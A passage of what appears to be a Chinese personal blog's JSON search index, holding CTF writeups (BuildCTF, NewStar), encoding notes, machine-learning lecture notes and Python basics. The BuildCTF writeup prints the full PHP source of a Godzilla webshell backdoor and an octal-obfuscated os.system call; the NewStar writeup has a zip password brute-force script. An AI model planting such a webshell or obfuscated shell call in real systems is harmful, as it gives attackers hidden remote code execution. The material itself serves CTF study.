即可.\n","date":"2024-11-27T00:00:00Z","permalink":"https://XiaoYuan-420.gituhub.io/p/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E5%88%9D%E8%B5%9Bwp/","title":"强网青少初赛WP"},{"content":"编码系列(持续更新) Base家族 Base16 使用16个ASCII可打印字符（数字0-9和字母A-F），对任意字节数据进行编码。 先获取输入字符串每个字节的二进制值（不足8比特在高位补0），然后将其串联进来，再按照4比特一组进行切分，将每组二进制数分别转换成十进制。 Base16编码后的数据量是原数据的两倍：1000比特数据需要250个字符（即 250*8=2000 比特）。 注： 可以看到8比特数据按照4比特切分刚好是两组，所以Base16不可能用到填充符号=。\n换句话说：Base16使用两个ASCII字符去编码原数据中的一个字节数据。\nBase16编码是一个标准的十六进制字符串（注意是字符串而不是数值），更易被人类和计算机使用，因为它并不包含任何控制字符，以及Base64和Base32中的=符号。\nBase32 Base32编码是使用32个可打印字符（字母A-Z和数字2-7）对任意字节数据进行编码的方案，编码后的字符串不用区分大小写并排除了容易混淆的字符，可以方便地由人类使用并由计算机处理。 Base32主要用于编码二进制数据，但是Base32也能够编码诸如ASCII之类的二进制文本。 Base32将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足8比特高位补0）串联起来，按照5比特一组进行切分，并将每组二进制值转换成十进制来对应32个可打印字符中的一个。 由于数据的二进制传输是按照8比特一组进行（即一个字节），因此Base32按5比特切分的二进制数据必须是40比特的倍数（5和8的最小公倍数）。\n例如输入单字节字符%，它对应的二进制值是100101，前面补两个0变成00100101（二进制值不足8比特的都要在高位加0直到8比特），从左侧开始按照5比特切分成两组：00100和101，后一组不足5比特，则在末尾填充0直到5比特，变成00100和10100，这两组二进制数分别转换成十进制数，通过上述表格即可找到其对应的可打印字符E和U，但是这里只用到两组共10比特，还差30比特达到40比特，按照5比特一组还需6组，则在末尾填充6个=。填充=符号的作用是方便一些程序的标准化运行，大多数情况下不添加也无关紧要，而且，在URL中使用时必须去掉=符号。\nBase64 Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于 $2^6=64$ ，所以每6个比特为一个单元，对应某个可打印字符。3个字节有24个比特，对应于4个Base64单元，即3个字节可由4个可打印字符来表示。 注：BinHex的版本使用不同的64字符集来代表6个二进制数字，但是不被称为Base64。\n如果要编码的字节数不能被3整除，最后会多出1个或2个字节，那么可以使用下面的方法进行处理：\n先使用0字节值在末尾补足，使其能够被3整除，然后再进行Base64的编码。 在编码后的Base64文本后加上一个或两个=号，代表补足的字节数。 也就是说：\n当最后剩余两个八位(待补足)字节（2个byte）时，最后一个6位的Base64字节块有四位是0值，最后附加上两个等号；\n如果最后剩余一个八位(待补足)字节（1个byte）时，最后一个6位的base字节块有两位是0值，最后附加一个等号。\nMD5 1 2 3 4 5 6 明文：admin 32位小写21232f297a57a5a743894a0e4a801fc3 32位大写21232F297A57A5A743894A0E4A801FC3 16位小写7a57a5a743894a0e 16位大写7A57A5A743894A0E Tips：十六位其实就是取32位的8-24位 MD5 加密后的密文应该是 纯数字+纯字符\nemoji-aes编码 emoji-aes使用对称aes加密密码加密字符串数据，然后用emojis替换Base64输出。 1 2 3 Message: flag Key: f@1g encryption: 🙃💵🌿🎤🚪🌏🐎🥋🚫😆😍🚫🌊📮🐘🖐🌉🥋✉🕹🎃☂🎤🎈🥋🐘✅🌪🕹🍌👌🎅🚨☃☀🕹🍵📂😆😍😁📂❓🗒 emoji-aes\n词频分析 一堆文字，看着什么编码都不像的，可能是词频分析，用在线网站跑\n字频分析 通常是给了一大段文字，然后用随波逐流分析就好\n摩斯电码 变种很多，直接用厨子跑就行\n维吉尼亚密码 一种典型的多表替换密码\n给了密文和Key\n直接拉到cyberchef中解密即可\n给了密文，没给密钥，但是知道目标明文的格式\n先用B神的脚本爆破出Key，然后再把这个Key放到cyberchef中解密\n根据对照表，手搓密钥的前几位\n希尔密码 解密网站\n已知密文和密钥，并且密钥(key)是一个网址，如http://www.verymuch.net\n已知密文和密钥，并且密钥是四个数字\n1 2 密文：exky 密钥：11 45 1 4 Rabbi密码 已知密文和密钥，密文有点像base64编码的(可能有+号)\n云隐密码 特征是：密文只由01248组成\n用随波逐流中的脚本直接跑\n社会主义核心价值观密码 解密网址\n公正民主公正文明公正和谐：abc\n盲文 使用在线翻译\n音乐符号 Tips：这里要注意，加密的密文一定是以=结尾的，有时候需要自己把=加上\n1 eg：♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§= 直接用在线网站解密\nPolybius密码（棋盘密码） CTFWiki上有详细介绍，如果给了一串数字但是用16进制出不来的话，可以试一下。\n埃特巴什码(Atbash) 类似于：(+w)v\u0026amp;LdG_FhgKhdFfhgahJfKcgcKdc_eeIJ_gFN\n拉入厨子直接解密\nDNA编码 使用CTFD中的DNAcode脚本解密，随波逐流里面也有。\nDecabit编码 正常的 Decabit编码 是十个字符一组的，如果不是十个一组，就很可能不是 Decabit编码\n1 +-+-++–+- ++—+-++- -+–++-++- +–++-++– –+++++— ++-++—+- +++-+-+— +-+-+—++ —+++-++- -+–++-++- -+–+++-+- -+–++-++- -+–++-++- ++-+-+-+– -+–+++-+- ++-++—+- -++++—+- -+–++-++- ++-+-+-+– +-+++—+- +++-++—- —+++-++- +-+-+—++ ++-+-+-+– +-+-+–++- ++–+–++- -++++—+- +—+++-+- ++-+-+-+– -++++—+- -+–+++-+- +–+-+-++- +++-+-+— +-+++—+- -+–+-+++- -+–++-++- —+++-++- ++++—-+- -++++—+- -+–+++-+- -+–++-++- —-+++++- 在线网站解。\n仿射密码 有两个key，key-a为必须是(1,3,5,7,9,11,15,17,19,21,23,25)中的一个,key-b是0~25的数字\n可以使用在线网站解。\nBrainFuck编码 随波逐流解。感觉和Decabit点像？\n1 +++++ +++[- \u0026gt;++++ ++++\u0026lt; ]\u0026gt;++. \u0026lt;++++ +++[- \u0026gt;++++ +++\u0026lt;] \u0026gt;++.\u0026lt; +++[- \u0026gt;---\u0026lt; ]\u0026gt;--- .+++. ----- ---.\u0026lt; +++++ [-\u0026gt;-- ---\u0026lt;] \u0026gt;---- ----. \u0026lt;++++ [-\u0026gt;++ ++\u0026lt;]\u0026gt; +.\u0026lt;++ +[-\u0026gt;- --\u0026lt;]\u0026gt; ----- .\u0026lt;+++ ++++[ -\u0026gt;+++ ++++\u0026lt; ]\u0026gt;+++ +.\u0026lt;++ +++++ [-\u0026gt;-- ----- \u0026lt;]\u0026gt;-- ----. \u0026lt;++++ +[-\u0026gt;+ ++++\u0026lt; ]\u0026gt;+++ +.\u0026lt;++ ++++[ -\u0026gt;--- ---\u0026lt;] \u0026gt;---- --.\u0026lt;+ ++[-\u0026gt; +++\u0026lt;] \u0026gt;+.\u0026lt;+ ++++[ -\u0026gt;+++ ++\u0026lt;]\u0026gt; +++++ .\u0026lt;+++ ++[-\u0026gt; ----- \u0026lt;]\u0026gt;-- -.\u0026lt;++ ++++[ -\u0026gt;+++ +++\u0026lt;] \u0026gt;++++ ++++. +++++ +++.\u0026lt; ++++[ -\u0026gt;--- -\u0026lt;]\u0026gt;- ----. \u0026lt;++++ [-\u0026gt;++ ++\u0026lt;]\u0026gt; .\u0026lt;+++ ++++[ -\u0026gt;--- ----\u0026lt; ]\u0026gt;--- ----- ----- -.++. .\u0026lt;+++ ++++[ -\u0026gt;+++ ++++\u0026lt; ]\u0026gt;+++ +++.+ ++.-. \u0026lt;+++[ -\u0026gt;--- \u0026lt;]\u0026gt;-- ----. \u0026lt;++++ ++[-\u0026gt; ----- -\u0026lt;]\u0026gt;- ----- ----. ++++. \u0026lt;++++ ++[-\u0026gt; +++++ +\u0026lt;]\u0026gt;+ +++++ .\u0026lt;+++ +++[- \u0026gt;---- --\u0026lt;]\u0026gt; ----- ---.\u0026lt; +++[- \u0026gt;+++\u0026lt; ]\u0026gt;+++ ++.\u0026lt;+ ++[-\u0026gt; ---\u0026lt;] \u0026gt;---. \u0026lt;++++ ++[-\u0026gt; +++++ +\u0026lt;]\u0026gt;. \u0026lt;++++ ++[-\u0026gt; +++++ +\u0026lt;]\u0026gt;. \u0026lt; Gronsfeld密码 没遇到过什么样的，但是在网上看到了，也没给示例，就贴了一个解密脚本。不懂什么意思。\n1 2 3 4 5 6 7 8 # 解密脚本 from pycipher import Gronsfeld cipher = \u0026#39;TGLBOMSJNSRAJAZDEZXGHSJNZWHG\u0026#39; key = [1,50,61,8,9,20,63,41] secret = Gronsfeld(key).decipher(cipher) print(secret) UUencode编码 AAencode编码 XXencode编码 上面三个统统拉到厨子里\nsnow隐写 空格和制表符组成的，并不是零宽字符，用snow解。\n零宽字符隐写 应该挺好看出来的，直接在线网站解就好了。\n文字盲水印 很明显的一个标志就是文本里有DEL删除符，用PuzzleSolver解。\n阴阳怪气 与佛论禅 与熊论道 天书奇谈 无字天书 中文电报（中文电码） Quote-Printable编码 类似于下面这样的编码，直接拉进厨子解。\n1 2 3 flag{ichunqiu_=E6=8A=80=E6=9C=AF=E6=9C=89=E6=B8=A9=E5=BA=A6} flag{ichunqiu_技术有温度} 中文ascii码 培根密码 由 a、b 或者 A、B 或者 0、1 组成的密文，密文中只有两种字符，可以直接使用 随波逐流 解密\nTips：CyberChef 的培根密码解密可能会有点问题，这里建议用随波逐流解密。\n锟斤拷 Notepad++里直接转成utf-8。\n键盘坐标密码 参考moectf-2024捂住一只耳。\n福尔摩斯密码 1 ·-· ·-· ·-· ·-· ·-· ·-· · 直接网上查找福尔摩斯密码对照表即可 flag{RRRRRRE}\n手机九宫格键盘密码 ","date":"2024-10-28T15:43:08+08:00","permalink":"https://XiaoYuan-420.gituhub.io/p/%E7%BC%96%E7%A0%81%E7%B3%BB%E5%88%97/","title":"编码系列"},{"content":"BuildCTF WP Misc部分 第一次和各位师傅把misc AK了，太强了，太有成就感了！感谢各位\nwhat is this? from binary得到\nccc,ppppp,ccppcp,p,cccc,cpppp,ccc,ccppcp,cpppp,ccccc,ccppcp,pp,ppppp,cpc,ccccc,c,ccppcp,pcpc,ppppp,pcc,c,ccppcp,pcpcpp,pcpcpp\n将c对应.，p 对应- 得到S0_TH1S_15_M0R5E_C0DE_!!\n别真给我开盒了哥 根据图片搜S3901找到视频\n知道是S3700高速，找一下旁边平行的铁路有津霸客运专线，也就是津保铁路\n如果再来一次，还会选择我吗？ 看一眼文件头和文件尾，是两个字节之间的交换\n1 2 3 4 5 6 7 8 9 10 with open(\u0026#34;password.png\u0026#34;, \u0026#39;rb\u0026#39;) as file: data = bytearray(file.read()) # 交换每两个相邻字节 for i in range(0, len(data) - 1, 2): data[i], data[i + 1] = data[i + 1], data[i] # 将修改后的数据写入新文件 with open(\u0026#34;output_file.png\u0026#34;, \u0026#39;wb\u0026#39;) as file: file.write(data) 得到解压密码：8!67adz6，在线网站直接扫条形码得到key:wo_bu_shi_xiao_hei_zi!!!，最后套好几次 Base64 解出 BuildCTF{y0u_are_great_boy}\n老色批 lsb隐写，提取Red0 Green0 Blue0按Row，LSBfirst得到 QnVpbGRDVEZ7MV9hbV9uMHRfTFNCISEhfQ== Base64解码一下得到flag BuildCTF{1_am_n0t_LSB!!!}\n一念愚即般若绝，一念智即般若生 阴阳怪气加密+与佛论禅+天书奇谈+Base58\nBuildCTF{D3crypt10n_1s_4_l0ng_r04d}\n四妹，你听我解释 winhex打开在文件末尾(IEND后)得到密文的前半段，crc爆破图片原有长宽得到密文后半段，组合起来核心价值观解密得到flag\n密文：自由文明法治平等公正敬业公正友善公正公正自由自由和谐平等自由自由公正法治友善平等公正诚信文明公正民主公正诚信平等平等诚信平等法治和谐公正平等平等友善敬业法治富强和谐民主法治诚信和谐\nBuildCTF{lao_se_p1}\n白白的真好看 flag1:打开doc文件，在字体样式中把隐藏文字关了，得到第一部分BuildCTF{Th3_wh1t3\nflag2:打开第1个txt文件，看到文件名00000000结合文档空白的内容联想到零宽隐写，在线网站得_y0u_s33\nflag3:扫描汉信码关注公众号回复雪得到snowsnow，结合第2个txt的文件名和内容中出现的许多空格和制表符，查到snow隐写，snowsnow为密钥，得_1s_n0t_wh1t3\n四妹？还是萍萍呢？ 二维码拼图，扫码得到林风云公众号。\nbinwalk检查图片，发现End of Zip archive，winhex打开后定位到对应的IDAT，在这个IDAT头部发现0304，是zip文件头的一半。将这个IDAT提取出来，补全文件头，发现压缩包里包含公众号回复password有惊喜.txt，发送后得到St7wg.。用密码解压，发现txt里是base64编码的png，转换后进行crc爆破，得到BuildCTF{PNG_@nd_H31Sh3nHu@}\n食不食油饼 文字盲水印PuzzleSolver提取，b64得到key:7gkjT!opo\nkey.jpg用WaterMarkH提取8GMdP3\nflag.txt \u0026gt; IJ2WS3DEINKEM62XMF2DG4SNMFZGWXZRONPVGMC7MVQVG6L5\nb32 \u0026gt; BuildCTF{Wat3rMark_1s_S0_eaSy}\nEZ_ZIP 1 2 3 4 import shutil for i in range(499,0,-1): shutil.unpack_archive(f\u0026#34;./layer_{i}.zip\u0026#34;, f\u0026#34;./\u0026#34;, \u0026#34;zip\u0026#34;) 有黑客！！！ 哥斯拉webshell流量，stream 11809中，解密返回payload。\nBuildctf{WireshArk_1s_vEry_Ez}\nstream 11809: /uploads/shell.php 哥斯拉\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i\u0026lt;strlen($D);$i++) { $c = $K[$i+1\u0026amp;15]; $D[$i] = $D[$i]^$c; } return $D; } $pass=\u0026#39;hhhhacker\u0026#39;; $payloadName=\u0026#39;payload\u0026#39;; $key=\u0026#39;73b761208d5c05f2\u0026#39;; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); //Encode payload with $key. if (strpos($payload,\u0026#34;getBasicsInfo\u0026#34;)===false){ $payload=encode($payload,$key); //Decode payload with $key. } eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (strpos($data,\u0026#34;getBasicsInfo\u0026#34;)!==false){ $_SESSION[$payloadName]=encode($data,$key); } } } 心算 __𝑖𝑚𝑝𝑜𝑟𝑡__(\u0026quot;\\157\\163\u0026quot;).𝑠𝑦𝑠𝑡𝑒𝑚(\u0026quot;\\143\\141\\164\\40\\146\\154\\141\\147\u0026quot;)\nGuesscoin nc连接容器，发现欢迎来到硬币猜测游戏!你需要猜100次,猜对60次才能获得flag。\n简单尝试一次，就通过了。\n恭喜你！你猜对了64次 欢迎拿到flag:\n我太喜欢亢金星君了！ 白图是分隔，黑图不用管\n-\u0026hellip; ..- .. .-.. -.. -.-. - ..-. \u0026mdash;-.\u0026ndash; .\u0026ndash; \u0026hellip;.- .\u0026mdash;- -.-. \u0026mdash; \u0026ndash; \u0026hellip;.- ..\u0026ndash;.- -. \u0026hellip;.- .\u0026ndash; ..\u0026ndash;.- ..-. .\u0026mdash;- \u0026hellip; \u0026hellip;. \u0026mdash;-.-\nBUILDCTFW41COM4_N4W_F1SH\nBlack\u0026amp;White 文件夹里有1089张纯黑/纯白的方形图片，猜测可以拼成33*33的二维码。\n使用python拼图，扫码得到 3I8XEDHUCJTARQFOEDX7D+08AC80T8N08Y6948DF2C43C9B6Z2，使用Base45解码，得到flag。\nBuildCTF{Tich1?pAnDa?_HahA_U_w1n}\nHEX的秘密 1 2 3 4 5 6 7 with open(\u0026#34;flag.txt\u0026#34;, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: flag = f.read() flag = [flag[i:i+2] for i in range(0, len(flag), 2)] flag = [hex(int(i, 16) ^ 0x80) for i in flag] print(\u0026#34;\u0026#34;.join(flag)) 得到0x420x750x690x6c0x640x430x540x460x7b0x330x450x7a0x7a0x5f0x410x350x630x210x210x5f0x620x690x6e0x610x720x790x790x790x7d\nfrom hex 得到 BuildCTF{3Ezz_A5c!!_binaryyy}\nFindYourWindows 用veracyrypt挂载，diskgenius恢复回收站里的文件找到flag.txt，得到BuildCTF{I2t_s0_e5sy!!!}\nE2_?_21P 将加密的两个标志位改成0，解压发现CRC校验失败，在010中将源数据区和目录区的压缩方法修改，BrainFuck解密得到BuildCTF{Da7A_Cowbr355lon_15_3A5Y}\n","date":"2024-10-24T22:35:40+08:00","permalink":"https://XiaoYuan-420.gituhub.io/p/buildctf-wp-misc%E9%83%A8%E5%88%86/","title":"BuildCTF WP Misc部分"},{"content":"Intro what is machine learning 让机器具备找一个函数的能力 语音识别 输入：声音信号\n输出：文字\n这个函数很复杂，人类无法编写出，让机器自己找到这个函数的过程便是机器学习\n图像识别 阿尔法狗 different types of function regression：输出为数值（scalar） classification：分类（classes） structured learning：创造 training 含参函数\n$y = b + wx_1$ -\u0026gt; Model -\u0026gt; Linear\n$x,y$ -\u0026gt; feature\n$w$ -\u0026gt; weight\n$b$ -\u0026gt; bias\nLoss\n$L(b, w)$ 来自于训练集\n$x_1$ -\u0026gt; $0.5k + 1x_1 = y$ -\u0026gt; $\\widehat{y}$ -\u0026gt; label\n$e_1 = |y - \\widehat{y}| \u0026hellip;$ -\u0026gt; Loss: $L = \\frac{1}{N}\\sum_{n}^N e_n$\n$e = |y - \\widehat{y}|$ -\u0026gt; MAE\n$e = (y - \\widehat{y})^2$ -\u0026gt; MSE\nIf $y$ and $\\widehat{y}$ are bath probability distributions -\u0026gt; Cross-entropy\nerror surface\noptimization\n$w^, b^ = arg \\min_{w, b}{L}$\ngradient descent\n随机选取 $w^0$ 计算 $w$ 对 $L$ 的微分在$w^0$处的值 斜率为负，增加 $w$ ；斜率为正，减小 $w$ 增大和减小的数值根据斜率和学习率来决定 hyperparameters $w^0$ -\u0026gt; $w^1$ -\u0026gt; \u0026hellip; 更新次数/$w^tt = 0$ 停止 global minima local minima evaluation\n","date":"2024-10-19T15:41:42+08:00","permalink":"https://XiaoYuan-420.gituhub.io/p/intro/","title":"Intro"},{"content":"NewStar 第一周 WP Misc decompress 附件是一个很多层的zip压缩包。一路点到最里面，得到一个hint和有加密的压缩包\nhint提示的是密码的正则表达式 ^([a-z]){3}\\d[a-z]$ 翻译一下，以3个小写字母打头+1个数字+1个小写字母结尾\nexp.py进行密码爆破\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import zipfile import itertools from string import ascii_lowercase zipfile_name = \u0026#39;decompressit.zip\u0026#39; zip_file = zipfile.ZipFile(zipfile_name, \u0026#39;r\u0026#39;) combinations = itertools.product(ascii_lowercase, repeat=3) for combination in combinations: password = \u0026#39;\u0026#39;.join(combination) for num in range(10): password += str(num) for letter in ascii_lowercase: password += letter print(f\u0026#34;try:{password}\u0026#34;) try: zip_file.extractall(pwd=password.encode()) print(f\u0026#39;Password found: {password}\u0026#39;) break except Exception: password = password[:-1] password = password[:-1] 得到密码xtr4m,然后用7-zip点开.zip.001得到true flagflag{U_R_th3_ma5ter_0f_dec0mpress}\n这里可以直接点.zip.001进行解压缩应该是7-zip的特性，如果进行和并的话需要进行合并\n1 copy /B 1.zip.001 + 1.zip.002 + 1.zip.003 1.zip 笔记区 正则表达式 常见的文件头识别和修复 pleasingMusic 拿到音乐一听，一眼丁真摩斯密码，正向得到. ..- --- .-.- -.--.. . ... .-. --- -- -.--.. ..-- .，结合题目提示反着来得到. --.. ..--.- -- --- .-. ... . ..--.- -.-. --- -.. .翻译一下ez_morse_code\nWhereIsFlag 虚拟机开Linux环境，nc链接题目环境，用ls慢慢搜就出来了。\nLabyrinth LSB隐写，用StegSolve在Red plane 0通道下看到了二维码，扫码得到flag{e33bb7a1-ac94-4d15-8ff7-fd8c88547b43}\n兑换码 png改宽高\n用010 Editor打开，在struct PNG_CHUNK chunk[0]下的struct PNG_CHUNK_IHDR ihdr下修改高度就可以看到flag文字。\nWeb headach3 用hackbar插件在请求头里加上doctor: true就行了。\n会赢吗 第一部分：按F12看源代码\n第二部分：在源代码里看到了revealFlag(className)函数，去控制台输入revealFlag(\u0026quot;4cqu1siti0n\u0026quot;)拿到flag\n第三部分：先看script里的代码，发现把\u0026lt;span id=\u0026quot;state\u0026quot;\u0026gt;标签内的文字改成解封，再按按钮就得到了。\n第四部分：有个\u0026lt;noscript\u0026gt;标签，禁用js后出现无量空处的bottom，单击得到最后一部分。\n","date":"2024-10-05T14:45:13+08:00","permalink":"https://XiaoYuan-420.gituhub.io/p/newstar-%E7%AC%AC%E4%B8%80%E5%91%A8-wp/","title":"NewStar 第一周 WP"},{"content":"Python基础知识 学前提醒 一定记得要自己动手编程试试哦~\nPython简介 语言特点:面向对象、解释型、高级计算机程序设计语言 ①面向对象：使用函数与类(在后面拓展中有讲)的方式编程解决问题 ②解释型：在运行时，首先要将每条语句进行检查编译成机器语言(即0与1)再进行自顶而下的运行 ③优缺点:编写容易但运行速度较慢 Python Shell：交互式解释器,输入一条执行一条,输入的语句不会被保存 编辑器：输入的语句不会立刻被执行，编写完成保存并运行时才会被执行 历史(课外阅读):Python从诞生至今经历了一次大的更新换代,即Python2到Python3的飞跃。由于Python2功能的不完善,运行速度慢，维护困难等缺点，Python的创始人在C语言的基础上重新设计了Python3,与原先Python2在语法上有较大的差异，而原先的Python 2也渐渐淡出了历史舞台.我们学习的也都是Python3的语法. 目前较稳定的Python版本:Python 3.8,Python3.9,Python3.10,Python3.12 笔者的环境是Python3.12.0 输入与输出语句 输入语句：input() 在括号内可以输入提示语 注意通过input()得到的是字符串 1 a = input(\u0026#34;请输入一串字符：\u0026#34;) # 输入123456 输出语句：print() 括号内可以传入多个要输出的值 注意：当出现运算符＋时，请一定当心加号两边的数据类型是否一致，该如何转化 1 print(a, type(a)) # type()用来查看a的数据类型 123456 \u0026lt;class 'str'\u0026gt; 数据类型 1 2 3 num1 = 123 # int类型 十进制 num2 = 0b100101 # int类型 二进制 num3 = 0x1a2b3c # int类型 十六进制 1 2 float1 = 1.0 # float类型 float2 = 1e5 # float类型 科学计数法 相当于 1.0*10^5 1 2 3 str1 = \u0026#34;I\u0026#39;m Li Hua\u0026#34; # str类型 由双引号引导 str2 = \u0026#39;He said:\u0026#34;I am not good.\u0026#34;\u0026#39; # str类型 由单引号引导 str3 = \u0026#39;\u0026#39;\u0026#39;That\u0026#39;s a desk\u0026#39;\u0026#39;\u0026#39; # str类型 由三引号引导 1 2 bool1 = True # bool类型 真值 bool2 = False # bool类型 假值 运算符与表达式 表达式:由数字、运算符、数字分组符号、自由变量和约束变量等以能求得数值的有意义排列方法所得的组合 运算符: 算术运算符\n注:若C=a%b, 当b\u0026gt;0时C∈[0,b) 当b\u0026lt;0时C∈(b,0]\n关系运算符\n注:链式比较 a\u0026lt;=b\u0026lt;=c ⇔ a\u0026lt;=b and b\u0026lt;=c\n逻辑运算符\n注:if not flag: ⇔ if flag==False:\n数据结构：（也是数据类型） 字符串（关于转义字符可转到“关于格式化输出”） 索引：从零开始的标号 索引取值 切片：格式：s[start:end:step] 1 2 3 4 5 6 7 8 9 s = \u0026#34;Hello,World\u0026#34; print(s[1]) try: print(s[11]) # 超出索引取值会报错 IndexError: string index out of range except IndexError as e: print(e) # 切片 s = \u0026#34;Hello,World\u0026#34; print(s[1:5]) e string index out of range ello 速会切片： 提示：若为负索引，将其加 len(s) 变为正索引 小技巧：\n①判断是否为空切片： 判断 (end-start) /step 是否大于 0(\u0026lt; 0为空)\n②切片中的元素个数（可用来检查）n=(end-start)//step\n列表 索引、切片与字符串相同 列表方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 l = [\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;] print(f\u0026#34;{l=}\u0026#34;) l.append(\u0026#34;D\u0026#34;) # 向列表末尾插入一位元素 print(f\u0026#34;{l=}\u0026#34;) l.insert(4, \u0026#34;E\u0026#34;) # 插入，第一个参数为索引，第二个参数为元素 print(f\u0026#34;{l=}\u0026#34;) # 超过列表长度会被加入到列表末尾,现在列表长度为5 l.insert(10, \u0026#34;F\u0026#34;) print(f\u0026#34;{l=}\u0026#34;) del_val = l.pop() # 当pop中不传入任何参数时，默认删除最后一个元素 print(f\u0026#34;{l=}, {del_val=}\u0026#34;) del_val = l.pop(3) # 删除指定索引上的元素，会返回被删除的元素 print(f\u0026#34;{l=}, {del_val=}\u0026#34;) l.remove(\u0026#34;E\u0026#34;) # 删除指定元素，若存在多个，删除第一个出现的该元素 # remove没有返回值 print(f\u0026#34;{l=}\u0026#34;) l=['A', 'B', 'C'] l=['A', 'B', 'C', 'D'] l=['A', 'B', 'C', 'D', 'E'] l=['A', 'B', 'C', 'D', 'E', 'F'] l=['A', 'B', 'C', 'D', 'E'], del_val='F' l=['A', 'B', 'C', 'E'], del_val='D' l=['A', 'B', 'C'] 字典（也叫哈希表(Hash Table)）\n键-值对(可以有相同的值)： {key1:valuel, key2:value2,\u0026hellip;}\n键：可以是字符串、元组、整型、浮点型 不能是列表、字典(它们是unhashable,不能被哈希化的) 值：可以是任何类型 取值：\u0026lt;字典名\u0026gt;[\u0026lt;键名\u0026gt;]\n键名不在字典中会引发KeyError 字典方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 d = {\u0026#34;A\u0026#34;: 10, \u0026#34;B\u0026#34;: 11, \u0026#34;C\u0026#34;:12} print(d.keys()) # 返回Keys对象,可迭代 print(\u0026#34;---------\u0026#34;) for key in d.keys(): print(key) print(\u0026#34;---------\u0026#34;) print(d.values()) # 返回Values对象,可迭代 print(\u0026#34;---------\u0026#34;) for val in d.values(): print(val) print(\u0026#34;---------\u0026#34;) print(d.items()) # 返回Items对象,可迭代 print(\u0026#34;---------\u0026#34;) for key, val in d.items(): print(key, val) print(\u0026#34;---------\u0026#34;) s = \u0026#34;1A\u0026#34; for i in s: # get方法，若键名不在字典中，返回第二个参数 print(d.get(i, int(i, 16))) dict_keys(['A', 'B', 'C']) --------- A B C --------- dict_values([10, 11, 12]) --------- 10 11 12 --------- dict_items([('A', 10), ('B', 11), ('C', 12)]) --------- A 10 B 11 C 12 --------- 1 10 算法结构 顺序结构 1 2 3 4 a = 1 a = 2 a = 3 print(f\u0026#34;{a=}\u0026#34;) a=3 分支结构(if语句)：\n所有的分支结构只会运行至多1个(可能不运行)\n循环结构：(for语句与while语句)\nwhile语句中注意循环控制变量的值一定要有初值且一定在循环中被改变 while True循环一定有break语句(该情况下True就是True,不能是等于True的其它变量) break语句:结束当前整个循环 continue语句:进入下一趟循环 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 for i in range(1, 3): if i == 2: break for j in range(1, 5): print((i,j), end=\u0026#34;\\t\u0026#34;) print() print(\u0026#34;---------\u0026#34;) for i in range(1, 5): for j in range(1, 11): if j == 2: break print((i,j), end=\u0026#34;\\t\u0026#34;) print() print(\u0026#34;---------\u0026#34;) for i in range(1, 4): if i == 2: continue for j in range(1, 3): print((i,j), end=\u0026#34;\\t\u0026#34;) print() print(\u0026#34;---------\u0026#34;) for i in range(1, 4): for j in range(1, 3): if j == 2: continue print((i,j), end=\u0026#34;\\t\u0026#34;) (1, 1)\t(1, 2)\t(1, 3)\t(1, 4)\t--------- (1, 1)\t(2, 1)\t(3, 1)\t(4, 1)\t--------- (1, 1)\t(1, 2)\t(3, 1)\t(3, 2)\t--------- (1, 1)\t(2, 1)\t(3, 1)\t","date":"2024-09-30T11:12:41+08:00","permalink":"https://XiaoYuan-420.gituhub.io/p/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","title":"Python基础知识"},{"content":"TSCTF-J XiaoYuan Writeup MISC set set password 单个数字之和必须等于 25，拿 1凑 罗马数字的乘积必须为 35，直接输 XXXV 验证码尽量刷出不含罗马数字和数字之和较小的 元素符号的拿 H凑 图寻直接一个国家一个国家试 密码长度拿空格凑和0凑（刚好满足闰年） 把系统时间设置成0:00避免25的问题 讲究一个暴力解决，说啥做啥，设置好密码就OK\nwordle 要赢100局肯定要找一个必胜策略，在开局的时候要尽可能的选择字母种数多的，而且字母的出现频率要高，可以排除更多的单词或确定更多的信息\n直接贴源码\nimport socket import random import json import time from collections import Counter with open(\u0026#34;5-letter-word.json\u0026#34;, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: word_list = json.load(f) # word_list = [word for word in word_list if len(word) == 5] # with open(\u0026#34;5-letter-word.json\u0026#34;, \u0026#34;w\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: # json.dump(word_list, f) def connect_to_wordle_server(): \u0026#34;\u0026#34;\u0026#34;连接到Wordle服务器\u0026#34;\u0026#34;\u0026#34; host = \u0026#39;challenges.hazmat.buptmerak.cn\u0026#39; port = 21473 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((host, port)) # 连接到服务器 return sock class WordleSovler(): def __init__(self, all_word): self.all_word = all_word self.possible = all_word self.presence = set() self.presence_letter = set() self.vague = set() self.absence = set() def update_dict(self, guess, feedback): for ind, letter in enumerate(guess): if feedback[ind] == \u0026#34;O\u0026#34;: # print(f\u0026#34;{letter}确定\u0026#34;) self.presence.add((letter,ind)) self.presence_letter.add(letter) elif feedback[ind] == \u0026#34;-\u0026#34;: # print(f\u0026#34;{letter}存在\u0026#34;) self.vague.add((letter,ind)) self.presence_letter.add(letter) elif feedback[ind] == \u0026#34;X\u0026#34; and letter not in self.presence_letter: # 